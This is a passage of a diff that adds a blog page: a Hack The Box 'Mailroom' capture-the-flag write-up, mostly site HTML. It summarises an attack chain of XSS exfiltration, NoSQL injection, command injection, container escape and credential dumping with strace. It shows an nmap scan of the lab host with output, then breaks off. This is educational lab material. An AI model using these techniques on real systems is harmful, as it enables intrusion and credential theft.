@@ -1,0 +1,1807 @@
+
+
+
+
+
+
+
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="dark"
+  data-auto-appearance="true"
+><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="rgb(255,255,255)" />
+  
+  <title>HTB Mailroom &middot; Abraxas</title>
+    <meta name="title" content="HTB Mailroom &middot; Abraxas" />
+  
+  
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.74ad8406faea02f3e186ba5126249aaeed9073629e04b05037b903396b188724.js"
+    integrity="sha256-dK2EBvrqAvPhhrpRJiSaru2Qc2KeBLBQN7kDOWsYhyQ="
+  ></script>
+  
+  
+  
+  
+  
+  
+  
+    
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.017a29273e0d1e39f8792cba62098ea8e1c922fd373503ba94b73dcab44dea79.css"
+    integrity="sha256-AXopJz4NHjn4eSy6YgmOqOHJIv03NQO6lLc9yrRN6nk="
+  />
+  
+    
+    
+    
+  
+  
+  
+    
+    
+  
+  
+    
+    
+  
+  
+  
+    
+    <script
+      defer
+      type="text/javascript"
+      id="script-bundle"
+      src="/js/main.bundle.min.bb487ad6073790cb02c354ee8c5f8822c42c5513e10bf7a86bbe8f82118cd1fc.js"
+      integrity="sha256-u0h61gc3kMsCw1TujF&#43;IIsQsVRPhC/eoa76PghGM0fw="
+      data-copy="Copy"
+      data-copied="Copied"
+    ></script>
+  
+  
+  <meta
+    name="description"
+    content="
+      
+        Mailroom is a hard linux box vulnerable to multiple vulnerabilities including XXS, NoSQLi and command injection. It also involves stracing a process to dump passwords.
+      
+    "
+  />
+  
+  
+  
+  <link rel="canonical" href="//localhost:1313/blog/20230821-htb-mailroom/" />
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+<link rel="manifest" href="/site.webmanifest" />
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="//localhost:1313/blog/20230821-htb-mailroom/">
+  <meta property="og:site_name" content="Abraxas">
+  <meta property="og:title" content="HTB Mailroom">
+  <meta property="og:description" content="Mailroom is a hard linux box vulnerable to multiple vulnerabilities including XXS, NoSQLi and command injection. It also involves stracing a process to dump passwords.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2023-08-21T17:50:38+05:30">
+    <meta property="article:modified_time" content="2023-08-21T17:50:38+05:30">
+    <meta property="article:tag" content="Htb-Hard">
+    <meta property="article:tag" content="Wfuzz">
+    <meta property="article:tag" content="XXS">
+    <meta property="article:tag" content="HTTP Exfil">
+    <meta property="article:tag" content="NoSQLi-Bruteforce">
+    <meta property="article:tag" content="Command-Injection">
+    <meta property="og:image" content="//localhost:1313/blog/20230821-htb-mailroom/cover.png">
+
+  
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="//localhost:1313/blog/20230821-htb-mailroom/cover.png">
+  <meta name="twitter:title" content="HTB Mailroom">
+  <meta name="twitter:description" content="Mailroom is a hard linux box vulnerable to multiple vulnerabilities including XXS, NoSQLi and command injection. It also involves stracing a process to dump passwords.">
+
+  
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Blog Posts",
+    "name": "HTB Mailroom",
+    "headline": "HTB Mailroom",
+    
+    "abstract": "Mailroom is a hard linux box vulnerable to multiple vulnerabilities including XXS, NoSQLi and command injection. It also involves stracing a process to dump passwords.",
+    "inLanguage": "en",
+    "url" : "\/\/localhost:1313\/blog\/20230821-htb-mailroom\/",
+    "author" : {
+      "@type": "Person",
+      "name": "Abraxas"
+    },
+    "copyrightYear": "2023",
+    "dateCreated": "2023-08-21T17:50:38\u002b05:30",
+    "datePublished": "2023-08-21T17:50:38\u002b05:30",
+    
+    "dateModified": "2023-08-21T17:50:38\u002b05:30",
+    
+    "keywords": ["htb-hard","wfuzz","XXS","HTTP exfil","NoSQLi-bruteforce","command-injection","strace"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "3717"
+  }
+  </script>
+
+
+  
+  <meta name="author" content="Abraxas" />
+  
+    
+      <link href="mailto:abr4xa5@proton.me" rel="me" />
+    
+      <link href="https://abraxas.pages.dev/" rel="me" />
+    
+      <link href="https://discordapp.com/users/703653879375724657" rel="me" />
+    
+      <link href="https://github.com/AbraXa5" rel="me" />
+    
+      <link href="https://infosec.exchange/@Abraxas" rel="me" />
+    
+      <link href="https://twitter.com/Abr4Xa5_" rel="me" />
+    
+      <link href="/blog/index.xml" rel="me" />
+    
+  
+  
+  
+
+
+
+
+
+
+  
+  
+
+  
+  
+</head>
+<body
+    class="m-auto flex h-screen max-w-7xl flex-col bg-neutral px-6 text-lg leading-7 text-neutral-900 sm:px-14 md:px-24 lg:px-32 dark:bg-neutral-800 dark:text-neutral"
+  >
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="-translate-y-8 rounded-b-lg bg-primary-200 px-3 py-1 text-sm focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content"
+        ><span class="pe-2 font-bold text-primary-600 dark:text-primary-400">&darr;</span
+        >Skip to main content</a
+      >
+    </div>
+    
+    
+      <header class="py-6 font-semibold text-neutral-900 print:hidden sm:py-10 dark:text-neutral">
+  <nav class="flex items-start justify-between sm:items-center">
+    
+    <div class="z-40 flex flex-row items-center">
+      
+  <a
+    class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+    rel="me"
+    href="/"
+    >Abraxas</a
+  >
+
+    </div>
+    
+      
+      <label id="menu-button" for="menu-controller" class="block sm:hidden">
+        <input type="checkbox" id="menu-controller" class="hidden" />
+        <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+          <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+</span>
+        </div>
+        <div
+          id="menu-wrapper"
+          class="invisible fixed inset-0 z-30 m-auto h-full w-full cursor-default overflow-auto bg-neutral-100/50 opacity-0 backdrop-blur-sm transition-opacity dark:bg-neutral-900/50"
+        >
+          <ul
+            class="mx-auto flex w-full max-w-7xl list-none flex-col overflow-visible px-6 py-6 text-end sm:px-14 sm:py-10 sm:pt-10 md:px-24 lg:px-32"
+          >
+            <li class="mb-1">
+              <span class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400"
+                ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+</span></span
+              >
+            </li>
+            
+              
+                
+                <li class="group mb-1">
+                  
+                    <a
+                      href="/blog/"
+                      title=""
+                      onclick="close_menu()"
+                      
+                      ><span
+                          class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                          >Blog</span
+                        >
+                      </a
+                    >
+                  
+                </li>
+              
+                
+                <li class="group mb-1">
+                  
+                    <a
+                      href="/categories/"
+                      title=""
+                      onclick="close_menu()"
+                      
+                      ><span
+                          class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                          >Categories</span
+                        >
+                      </a
+                    >
+                  
+                </li>
+              
+                
+                <li class="group mb-1">
+                  
+                    <a
+                      href="/tags/"
+                      title=""
+                      onclick="close_menu()"
+                      
+                      ><span
+                          class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                          >Tags</span
+                        >
+                      </a
+                    >
+                  
+                </li>
+              
+                
+                <li class="group mb-1">
+                  
+                    <a
+                      href="/about-me/"
+                      title=""
+                      onclick="close_menu()"
+                      
+                      ><span
+                          class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                          >About Me</span
+                        >
+                      </a
+                    >
+                  
+                </li>
+              
+                
+                <li class="group mb-1">
+                  
+                    
+                    <button
+                      id="appearance-switcher-1"
+                      type="button"
+                      aria-label="appearance switcher"
+                    >
+                      <span
+                        class="group-dark:hover:text-primary-400 inline transition-colors group-hover:text-primary-600 dark:hidden"
+                        title="Switch to dark appearance"
+                      >
+                        <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span><span
+                            class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                            ></span
+                          >
+                        
+                      </span>
+                      <span
+                        class="group-dark:hover:text-primary-400 hidden transition-colors group-hover:text-primary-600 dark:inline"
+                        title="Switch to light appearance"
+                      >
+                        <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span><span
+                            class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                            ></span
+                          >
+                        
+                      </span>
+                    </button>
+                  
+                </li>
+              
+                
+                <li class="group mb-1">
+                  
+                    
+                    
+                      <button
+                        id="search-button-1"
+                        title="Search (/)"
+                      >
+                        
+                          <span
+                            class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"
+                          ><span class="icon relative inline-block px-1 align-text-bottom"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span></span><span
+                            class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                            ></span
+                          >
+                        
+                      </button>
+                    
+                  
+                </li>
+              
+              
+            
+          </ul>
+        </div>
+      </label>
+      
+      <ul class="hidden list-none flex-row text-end sm:flex">
+        
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
+              
+                <a
+                  href="/blog/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Blog</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
+              
+                <a
+                  href="/categories/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Categories</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
+              
+                <a
+                  href="/tags/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Tags</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
+              
+                <a
+                  href="/about-me/"
+                  title=""
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >About Me</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
+              
+                
+                <button
+                  id="appearance-switcher-2"
+                  type="button"
+                  aria-label="appearance switcher"
+                >
+                  <span
+                    class="group-dark:hover:text-primary-400 inline transition-colors group-hover:text-primary-600 dark:hidden"
+                    title="Switch to dark appearance"
+                  >
+                    <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+</span><span
+                        class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                        ></span
+                      >
+                    
+                  </span>
+                  <span
+                    class="group-dark:hover:text-primary-400 hidden transition-colors group-hover:text-primary-600 dark:inline"
+                    title="Switch to light appearance"
+                  >
+                    <span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+</span><span
+                        class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                        ></span
+                      >
+                    
+                  </span>
+                </button>
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0">
+              
+                
+                
+                  <button
+                    id="search-button-2"
+                    title="Search (/)"
+                  >
+                    
+                      <span
+                        class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"
+                      ><span class="icon relative inline-block px-1 align-text-bottom"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+</span></span><span
+                        class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                        ></span
+                      >
+                    
+                  </button>
+                
+              
+            </li>
+          
+          
+
+        
+      </ul>
+    
+  </nav>
+</header>
+
+    
+    <div class="relative flex grow flex-col">
+      <main id="main-content" class="grow">
+        
+  <article>
+    <header class="max-w-prose">
+      
+        <ol class="text-sm text-neutral-500 print:hidden dark:text-neutral-400">
+  
+  
+    
+  
+    
+  
+  <li class="hidden inline">
+    <a
+      class="dark:underline-neutral-600 decoration-neutral-300 hover:underline"
+      href="/"
+      >Abraxas</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class=" inline">
+    <a
+      class="dark:underline-neutral-600 decoration-neutral-300 hover:underline"
+      href="/blog/"
+      >Blog Posts</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+  
+  <li class="hidden inline">
+    <a
+      class="dark:underline-neutral-600 decoration-neutral-300 hover:underline"
+      href="/blog/20230821-htb-mailroom/"
+      >HTB Mailroom</a
+    ><span class="px-1 text-primary-500">/</span>
+  </li>
+
+</ol>
+
+
+      
+      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        HTB Mailroom
+      </h1>
+      
+        <div class="mb-12 mt-8 text-base text-neutral-500 print:hidden dark:text-neutral-400">
+          
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2023-08-21 17:50:38 &#43;0530 IST">21 August 2023</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">18 mins</span><span class="px-2 text-primary-500">&middot;</span>
+
+
+  
+    
+  
+  
+
+<span class="mb-[2px]">
+  <a
+    href="https://github.com/AbraXa5/personal-blog/tree/main/content/blog/20230821-htb-mailroom/index.md"
+    class="text-lg hover:text-primary-500"
+    rel="noopener noreferrer"
+    target="_blank"
+    title="Edit content"
+    ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M490.3 40.4C512.2 62.27 512.2 97.73 490.3 119.6L460.3 149.7L362.3 51.72L392.4 21.66C414.3-.2135 449.7-.2135 471.6 21.66L490.3 40.4zM172.4 241.7L339.7 74.34L437.7 172.3L270.3 339.6C264.2 345.8 256.7 350.4 248.4 353.2L159.6 382.8C150.1 385.6 141.5 383.4 135 376.1C128.6 370.5 126.4 361 129.2 352.4L158.8 263.6C161.6 255.3 166.2 247.8 172.4 241.7V241.7zM192 63.1C209.7 63.1 224 78.33 224 95.1C224 113.7 209.7 127.1 192 127.1H96C78.33 127.1 64 142.3 64 159.1V416C64 433.7 78.33 448 96 448H352C369.7 448 384 433.7 384 416V319.1C384 302.3 398.3 287.1 416 287.1C433.7 287.1 448 302.3 448 319.1V416C448 469 405 512 352 512H96C42.98 512 0 469 0 416V159.1C0 106.1 42.98 63.1 96 63.1H192z"/></svg>
+</span></a
+  >
+</span>
+    
+
+    
+    
+  </div>
+
+  
+  
+    <div class="my-1 flex flex-wrap text-xs leading-relaxed text-neutral-500 dark:text-neutral-400">
+      
+        
+          
+            <a
+              href="/categories/htb/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >HTB</a
+            >
+          
+            <a
+              href="/categories/linux/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Linux</a
+            >
+          
+        
+      
+        
+          
+            <a
+              href="/tags/htb-hard/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Htb-Hard</a
+            >
+          
+            <a
+              href="/tags/wfuzz/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Wfuzz</a
+            >
+          
+            <a
+              href="/tags/xxs/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >XXS</a
+            >
+          
+            <a
+              href="/tags/http-exfil/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >HTTP Exfil</a
+            >
+          
+            <a
+              href="/tags/nosqli-bruteforce/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >NoSQLi-Bruteforce</a
+            >
+          
+            <a
+              href="/tags/command-injection/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Command-Injection</a
+            >
+          
+            <a
+              href="/tags/strace/"
+              class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400"
+              >Strace</a
+            >
+          
+        
+      
+    </div>
+  
+
+
+        </div>
+      
+      
+        <div class="prose">
+          
+          
+          
+          
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mb-6 -mt-4 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="/blog/20230821-htb-mailroom/cover_hu1e1e7f1ff09c3c220f1057905ed92b27_68925_300x300_resize_q75_h2_box_3.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="300"
+        height="300"
+        class="mb-6 -mt-4 rounded-md"
+        
+        
+        
+          src="/blog/20230821-htb-mailroom/cover.png"
+        
+      />
+    </picture>
+  
+
+
+          
+        </div>
+      
+    </header>
+    <section class="prose mt-0 flex max-w-full flex-col dark:prose-invert lg:flex-row">
+      
+        <div class="order-first px-0 lg:order-last lg:max-w-xs lg:ps-8">
+          <div class="toc pe-5 print:hidden lg:sticky lg:top-10">
+            <details open class="-ms-5 mt-0 overflow-hidden rounded-lg ps-5">
+  <summary
+    class="block cursor-pointer bg-neutral-100 py-1 ps-5 text-lg font-semibold text-neutral-800 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden"
+  >
+    Table of Contents
+  </summary>
+  <div class="border-s border-dotted border-neutral-300 py-2 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#open-ports">Open Ports</a></li>
+        <li><a href="#http---mailroomhtb">HTTP - mailroom.htb</a></li>
+        <li><a href="#gitea---gitmailroomhtb">Gitea - git.mailroom.htb</a></li>
+      </ul>
+    </li>
+    <li><a href="#foothold">Foothold</a>
+      <ul>
+        <li><a href="#exfiltrating-data-using-xxs">Exfiltrating data using XXS</a></li>
+        <li><a href="#exploiting-nosqli">Exploiting NoSQLi</a></li>
+      </ul>
+    </li>
+    <li><a href="#horizontal-privilege-escalation">Horizontal Privilege Escalation</a>
+      <ul>
+        <li><a href="#shell-as-www-data-in-the-container">Shell as www-data in the container</a></li>
+        <li><a href="#docker-escape">Docker escape</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation-to-root">Privilege Escalation to root</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+          </div>
+        </div>
+      
+      <div class="min-h-0 min-w-0 max-w-prose grow">
+        <h1 id="mailroom-htb" class="relative group">Mailroom HTB <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#mailroom-htb" aria-label="Anchor">#</a></span></h1><hr>
+<blockquote>
+<p>The contact us page on the site is vulnerable to XXS, which gives access to an internal website that is vulnerable to NoSQLi and exfil the passwords of valid users. Using command injection gives a shell on the docker container. The container has credentials for another user on the machine, with which we see a user using kpcli to interact with a KeePass database. Using strace to dump the database&rsquo;s master password found credentials for other users, including root.</p>
+</blockquote>
+<hr>
+<h2 id="enumeration" class="relative group">Enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#enumeration" aria-label="Anchor">#</a></span></h2><hr>
+<h3 id="open-ports" class="relative group">Open Ports <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#open-ports" aria-label="Anchor">#</a></span></h3><p>Found 2 open ports using nmap,</p>
+<ul>
+<li>port 22 → SSH</li>
+<li>port 80 → Apache web server</li>
+</ul>
+<p>Although banners for both services are different, could be because of containerization or virtualization</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -p22,80 -sV -sC -T4 -Pn -oA 10.10.11.209 10.10.11.209
+</span></span><span class="line"><span class="cl">Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-07-17 01:52 EDT
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.209
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.057s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT STATE SERVICE VERSION
+</span></span><span class="line hl"><span class="cl">22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey:
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">3072</span> 94bb2ffcaeb9b182afd789811aa76ce5 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">256</span> 821beb758b9630cf946e7957d9ddeca7 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span><span class="se">\_</span> <span class="m">256</span> 19fb45feb9e4275de5bbf35497dd68cf <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line hl"><span class="cl">80/tcp open http Apache httpd 2.4.54 <span class="o">((</span>Debian<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span><span class="se">\_</span>http-server-header: Apache/2.4.54 <span class="o">(</span>Debian<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span><span class="se">\_</span>http-title: The Mail Room
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel</span></span></code></pre></div>
+<h3 id="http---mailroomhtb" class="relative group">HTTP - mailroom.htb <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#http---mailroomhtb" aria-label="Anchor">#</a></span></h3><p>According to the site&rsquo;s response headers, it is PHP based.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; http -ph 10.10.11.209
+</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">...
